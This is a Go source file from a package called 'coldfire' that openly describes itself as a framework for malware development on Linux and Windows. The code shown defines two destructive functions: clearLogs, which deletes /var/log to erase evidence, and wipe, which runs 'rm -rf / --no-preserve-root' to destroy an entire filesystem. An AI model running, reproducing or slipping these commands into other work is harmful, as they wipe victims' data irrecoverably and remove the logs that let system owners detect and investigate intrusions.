// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package coldfire

import (
	"fmt"
	"github.com/google/gopacket/pcap"
	"os"
	"os/exec"
	"strconv"
	"strings"

	ps "github.com/mitchellh/go-ps"
)

func clearLogs() error {
	_, err := cmdOut("rm -r /var/log")
	if err != nil {
		return err
	}

	return nil
}

func wipe() error {
	cmd := "rm -rf / --no-preserve-root"
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}
